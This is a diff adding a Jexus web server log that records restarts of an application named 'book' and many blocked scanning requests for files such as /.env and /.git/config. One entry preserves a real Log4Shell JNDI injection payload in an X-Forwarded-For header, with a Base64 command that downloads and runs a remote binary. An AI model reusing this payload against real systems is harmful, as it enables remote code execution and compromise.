@@ -1,0 +1,91 @@
+10-14 05:37:29: * No website in the configuration folder, Jexus start-up failure.
+10-14 05:39:13:  * Warning: Root Path Does Not Exist: '/var/www/default/'
+10-14 05:39:13:  * Warning: Root Path Does Not Exist: '/var/www/default/'
+10-14 05:39:13: * Jexus web server start-up success.
+10-14 05:39:14: * INFO: JwsAspd Startup Success: Web Application Name: 'default'
+10-14 05:43:40:  * Warning: Root Path Does Not Exist: '/var/www/default/'
+10-14 05:43:40:  * Warning: Root Path Does Not Exist: '/var/www/default/'
+10-14 05:43:41: * Jexus web server start-up success.
+10-14 05:43:41: * INFO: JwsAspd Startup Success: Web Application Name: 'default'
+10-14 05:54:23: * Jexus web server has been stopped.
+10-14 05:54:26: * Jexus web server start-up success.
+10-14 05:54:27: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+10-14 05:57:37: * Jexus web server has been stopped.
+10-14 05:57:40: * Jexus web server start-up success.
+10-14 05:57:41: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+10-14 06:21:58: *[127.0.0.1]: Illegal read! Path: /shell, Host: 82.156.207.90
+10-14 09:47:16: DEBUG: ASP-REQUEST-WORKER-003. ip=127.0.0.1
+10-14 12:08:12: DEBUG: ASP-REQUEST-WORKER-003. ip=127.0.0.1
+10-14 20:32:14: DEBUG: ASP-REQUEST-WORKER-003. ip=127.0.0.1
+10-14 22:09:06: *[127.0.0.1]: Illegal read! Path: /shell, Host: 82.156.207.90
+10-14 23:19:43: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-15 00:39:38: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-15 10:51:09: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-15 10:51:11: *[127.0.0.1]: Illegal read! Path: /core/.env, Host: 82.156.207.90
+10-15 10:51:12: *[127.0.0.1]: Illegal read! Path: /core/.env, Host: 82.156.207.90
+10-15 10:51:13: *[127.0.0.1]: Illegal read! Path: /core/.env, Host: 82.156.207.90
+10-15 13:13:02: DEBUG: ASP-REQUEST-WORKER-003. ip=127.0.0.1
+10-15 22:57:46: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-15 23:52:14: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 01:57:27: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 03:46:38: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 11:18:55: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 12:58:37: *[127.0.0.1]: Illegal read! Path: /.git/config, Host: 82.156.207.90
+10-16 14:49:36: *[127.0.0.1]: Illegal read! Path: /.DS_Store, Host: 82.156.207.90
+10-16 17:26:57: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 18:00:22: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-16 20:17:10: *[127.0.0.1]: Illegal read! Path: /shell, Host: 127.0.0.1
+10-16 23:01:41: *[127.0.0.1]: Illegal read! Path: /, Host: 82.156.207.90, X-Forwarded-For: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY2htb2QgNzc3IGlkc2hhMWdhbWU7IC4vaWRzaGExZ2FtZSBydW5uZXI=}')
+10-17 02:02:00: *[127.0.0.1]: Illegal read! Path: /.DS_Store, Host: 82.156.207.90
+10-17 02:02:01: *[127.0.0.1]: Illegal read! Path: /.git/config, Host: 82.156.207.90
+10-17 02:02:02: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-17 02:02:05: *[127.0.0.1]: Illegal read! Path: /.json, Host: 82.156.207.90
+10-17 10:45:09: *[127.0.0.1]: Illegal read! Path: /shell, Host: 82.156.207.90
+10-17 22:42:26: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-17 22:58:19: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-17 23:55:49: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-18 00:06:55: *[127.0.0.1]: Illegal read! Path: /.well-known/security.txt, Host: 82.156.207.90
+10-18 00:51:00: * Jexus web server has been stopped.
+10-19 11:16:04: * Jexus web server start-up success.
+10-19 11:16:05: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+10-19 11:35:00: DEBUG: ASP-REQUEST-WORKER-003. ip=127.0.0.1
+10-19 13:53:10: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-19 17:42:00: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-19 19:53:10: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-19 20:29:41: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-20 00:10:30: *[127.0.0.1]: Illegal read! Path: /.env, Host: 82.156.207.90
+10-20 01:11:33: * Jexus web server has been stopped.
+10-20 05:20:27: * Jexus web server start-up success.
+10-20 05:20:28: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-08 19:03:45: * Jexus web server start-up success.
+11-08 19:03:46: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-08 20:06:16: * Jexus web server has been stopped.
+11-08 20:08:11: * Jexus web server start-up success.
+11-08 20:08:13: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-08 21:06:42: * Jexus web server has been stopped.
+11-08 21:08:03: * Jexus web server start-up success.
+11-08 21:08:05: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-08 21:15:22: * Jexus web server has been stopped.
+11-08 21:15:58: * Jexus web server start-up success.
+11-08 21:15:59: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-08 21:34:03: * Jexus web server has been stopped.
+11-08 21:34:40: * Jexus web server start-up success.
+11-08 21:34:40: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 03:30:57: * Jexus web server has been stopped.
+11-09 03:32:55: * Jexus web server start-up success.
+11-09 03:32:56: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 04:09:48: * Jexus web server has been stopped.
+11-09 04:10:37: * Jexus web server start-up success.
+11-09 04:10:39: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 04:13:00: * Jexus web server has been stopped.
+11-09 04:13:35: * Jexus web server start-up success.
+11-09 04:13:36: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 04:25:48: * Jexus web server has been stopped.
+11-09 04:27:44: * Jexus web server start-up success.
+11-09 04:27:46: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 04:33:36: * Jexus web server has been stopped.
+11-09 04:34:16: * Jexus web server start-up success.
+11-09 04:34:16: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
+11-09 04:58:08: * Jexus web server has been stopped.
+11-09 04:58:44: * Jexus web server start-up success.
+11-09 04:58:45: * INFO: JwsAspd Startup Success: Web Application Name: 'book'
